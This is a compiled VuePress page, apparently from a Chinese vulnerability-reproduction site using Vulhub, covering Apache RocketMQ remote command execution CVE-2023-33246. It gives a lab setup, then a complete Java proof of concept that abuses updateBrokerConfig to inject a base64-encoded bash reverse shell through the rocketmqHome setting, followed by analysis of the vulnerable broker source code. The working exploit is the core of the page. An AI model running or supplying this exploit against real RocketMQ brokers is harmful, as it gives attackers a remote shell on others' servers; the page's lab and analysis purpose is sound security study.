import{_ as e}from"./plugin-vue_export-helper-c27b6911.js";import{r as o,o as p,c,a as n,b as s,d as t,e as i}from"./app-58e4a7d6.js";const l={},r=n("h2",{id:"漏洞描述",tabindex:"-1"},[n("a",{class:"header-anchor",href:"#漏洞描述","aria-hidden":"true"},"#"),s(" 漏洞描述")],-1),u=n("p",null,"Apache RocketMQ是一个分布式消息平台。",-1),d=n("p",null,"在其5.1.0版本及以前存在一处命令执行漏洞，攻击者通过向其更新配置相关的功能发送指令即可更新任意配置项，并通过配置项中存在的命令注入功能执行任意命令。",-1),k=n("p",null,"参考链接：",-1),v={href:"https://lists.apache.org/thread/1s8j2c8kogthtpv3060yddk03zq0pxyp",target:"_blank",rel:"noopener noreferrer"},m={href:"https://github.com/I5N0rth/CVE-2023-33246",target:"_blank",rel:"noopener noreferrer"},g=i(`<h2 id="环境搭建" tabindex="-1"><a class="header-anchor" href="#环境搭建" aria-hidden="true">#</a> 环境搭建</h2><p>Vulhub 使用 <code>docker compose</code> 或 <code>docker-compose</code> 启动：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>docker compose up -d
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>使用 <code>IDEA</code> 或 <code>Eclipse</code> 等 <code>IDE</code> 新建一个 <code>Maven</code> 项目，导入依赖：</p><div class="language-java line-numbers-mode" data-ext="java"><pre class="language-java"><code><span class="token generics"><span class="token punctuation">&lt;</span>dependencies<span class="token punctuation">&gt;</span></span>
    <span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span> https<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>mvnrepository<span class="token punctuation">.</span>com<span class="token operator">/</span>artifact<span class="token operator">/</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>rocketmq<span class="token operator">/</span>rocketmq<span class="token operator">-</span>tools <span class="token operator">--</span><span class="token operator">&gt;</span>
    <span class="token generics"><span class="token punctuation">&lt;</span>dependency<span class="token punctuation">&gt;</span></span>
        <span class="token generics"><span class="token punctuation">&lt;</span>groupId<span class="token punctuation">&gt;</span></span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>rocketmq<span class="token operator">&lt;</span><span class="token operator">/</span>groupId<span class="token operator">&gt;</span>
        <span class="token generics"><span class="token punctuation">&lt;</span>artifactId<span class="token punctuation">&gt;</span></span>rocketmq<span class="token operator">-</span>tools<span class="token operator">&lt;</span><span class="token operator">/</span>artifactId<span class="token operator">&gt;</span>
        <span class="token generics"><span class="token punctuation">&lt;</span>version<span class="token punctuation">&gt;</span></span><span class="token number">5.1</span><span class="token number">.0</span><span class="token operator">&lt;</span><span class="token operator">/</span>version<span class="token operator">&gt;</span>
    <span class="token operator">&lt;</span><span class="token operator">/</span>dependency<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span><span class="token operator">/</span>dependencies<span class="token operator">&gt;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>PoC 如下：</p><div class="language-java line-numbers-mode" data-ext="java"><pre class="language-java"><code><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>rocketmq<span class="token punctuation">.</span>tools<span class="token punctuation">.</span>admin<span class="token punctuation">.</span></span><span class="token class-name">DefaultMQAdminExt</span></span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Base64</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Properties</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Main</span> <span class="token punctuation">{</span>
    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token class-name">String</span> <span class="token function">getCmd</span><span class="token punctuation">(</span><span class="token class-name">String</span> ip<span class="token punctuation">,</span> <span class="token class-name">String</span> port<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token class-name">String</span> cmd <span class="token operator">=</span> <span class="token string">&quot;bash -i &gt;&amp; /dev/tcp/&quot;</span> <span class="token operator">+</span> ip <span class="token operator">+</span> <span class="token string">&quot;/&quot;</span> <span class="token operator">+</span> port <span class="token operator">+</span> <span class="token string">&quot; 0&gt;&amp;1&quot;</span><span class="token punctuation">;</span>
        <span class="token class-name">String</span> cmdBase <span class="token operator">=</span> <span class="token class-name">Base64</span><span class="token punctuation">.</span><span class="token function">getEncoder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">encodeToString</span><span class="token punctuation">(</span>cmd<span class="token punctuation">.</span><span class="token function">getBytes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token string">&quot;-c $@|sh . echo echo \\&quot;&quot;</span> <span class="token operator">+</span> cmdBase <span class="token operator">+</span> <span class="token string">&quot;\\&quot;|base64 -d|bash -i;&quot;</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">{</span>
        <span class="token class-name">String</span> targetHost <span class="token operator">=</span> <span class="token string">&quot;your-ip&quot;</span><span class="token punctuation">;</span>
        <span class="token class-name">String</span> targetPort <span class="token operator">=</span> <span class="token string">&quot;10911&quot;</span><span class="token punctuation">;</span>

        <span class="token class-name">String</span> shellHost <span class="token operator">=</span> <span class="token string">&quot;your-ip&quot;</span><span class="token punctuation">;</span>
        <span class="token class-name">String</span> shellPort <span class="token operator">=</span> <span class="token string">&quot;12345&quot;</span><span class="token punctuation">;</span>

        <span class="token class-name">String</span> targetAddr <span class="token operator">=</span> <span class="token class-name">String</span><span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span><span class="token string">&quot;%s:%s&quot;</span><span class="token punctuation">,</span>targetHost<span class="token punctuation">,</span>targetPort<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Properties</span> props <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Properties</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        props<span class="token punctuation">.</span><span class="token function">setProperty</span><span class="token punctuation">(</span><span class="token string">&quot;rocketmqHome&quot;</span><span class="token punctuation">,</span> <span class="token function">getCmd</span><span class="token punctuation">(</span>shellHost<span class="token punctuation">,</span>shellPort<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        props<span class="token punctuation">.</span><span class="token function">setProperty</span><span class="token punctuation">(</span><span class="token string">&quot;filterServerNums&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;1&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">DefaultMQAdminExt</span> admin <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DefaultMQAdminExt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        admin<span class="token punctuation">.</span><span class="token function">setNamesrvAddr</span><span class="token punctuation">(</span><span class="token string">&quot;0.0.0.0:12345&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        admin<span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        admin<span class="token punctuation">.</span><span class="token function">updateBrokerConfig</span><span class="token punctuation">(</span>targetAddr<span class="token punctuation">,</span> props<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Properties</span> brokerConfig <span class="token operator">=</span> admin<span class="token punctuation">.</span><span class="token function">getBrokerConfig</span><span class="token punctuation">(</span>targetAddr<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>brokerConfig<span class="token punctuation">.</span><span class="token function">getProperty</span><span class="token punctuation">(</span><span class="token string">&quot;rocketmqHome&quot;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>brokerConfig<span class="token punctuation">.</span><span class="token function">getProperty</span><span class="token punctuation">(</span><span class="token string">&quot;filterServerNums&quot;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        admin<span class="token punctuation">.</span><span class="token function">shutdown</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>在控制台成功输出新的配置后，请等待30秒左右，将会收到反连请求。</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20230605095851218.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><h2 id="漏洞分析" tabindex="-1"><a class="header-anchor" href="#漏洞分析" aria-hidden="true">#</a> 漏洞分析</h2><p>PoC 对 <code>filterServerNums</code> 属性和 <code>rocketmqHome</code> 属性进行了修改。</p><p>为什么要修改<code>filterServerNums</code>属性：如果配置的<code>filterServerNums</code>为0，计算得出的<code>more</code>也会是0，因此无法进入<code>callShell</code>方法执行命令。</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>public void createFilterServer() {
    int more =
        this.brokerController.getBrokerConfig().getFilterServerNums() -
        this.filterServerTable.size();
    String cmd = this.buildStartCommand();
    for (int i = 0; i &lt; more; i++) {
        FilterServerUtil.callShell(cmd, log);
    }
}

public static void callShell(final String shellString, final Logger log) {
    Process process = null;
    try {
        String[] cmdArray = splitShellString(shellString);
        process = Runtime.getRuntime().exec(cmdArray);
        process.waitFor();
        log.info(&quot;CallShell: &lt;{}&gt; OK&quot;, shellString);
    } catch (Throwable e) {
        log.error(&quot;CallShell: readLine IOException, {}&quot;, shellString, e);
    } finally {
        if (null != process)
            process.destroy();
    }
}
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>为什么要修改<code>rocketmqHome</code>属性：在构建命令的时候，最终会调用<code>splitShellString</code>方法按照空格对参数进行分割，所以不可以是<code>NamesrvAddr</code>参数，只能是开头的<code>rocketmqHome</code>参数，但是由于参数分割规则，所以需要更严格的命令和巧妙的技巧才可以执行。</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>private String buildStartCommand() {
    String config = &quot;&quot;;
    if (BrokerStartup.CONFIG_FILE_HELPER.getFile() != null) {
        config = String.format(&quot;-c %s&quot;,
        BrokerStartup.CONFIG_FILE_HELPER.getFile());
    }
    if (this.brokerController.getBrokerConfig().getNamesrvAddr() != null) {
        config += String.format(&quot; -n %s&quot;,
        this.brokerController.getBrokerConfig().getNamesrvAddr());
    }
    if (NetworkUtil.isWindowsPlatform()) {
        return String.format(&quot;start /b %s\\\\bin\\\\mqfiltersrv.exe %s&quot;,
        this.brokerController.getBrokerConfig().getRocketmqHome(),
        config);
    } else {
        return String.format(&quot;sh %s/bin/startfsrv.sh %s&quot;,
        this.brokerController.getBrokerConfig().getRocketmqHome(),
        config);
    }
}
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,16);function b(h,f){const a=o("ExternalLinkIcon");return p(),c("div",null,[r,u,d,k,n("ul",null,[n("li",null,[n("a",v,[s("https://lists.apache.org/thread/1s8j2c8kogthtpv3060yddk03zq0pxyp"),t(a)])]),n("li",null,[n("a",m,[s("https://github.com/I5N0rth/CVE-2023-33246"),t(a)])])]),g])}const _=e(l,[["render",b],["__file","Apache RocketMQ 远程命令执行漏洞 CVE-2023-33246.html.vue"]]);export{_ as default};
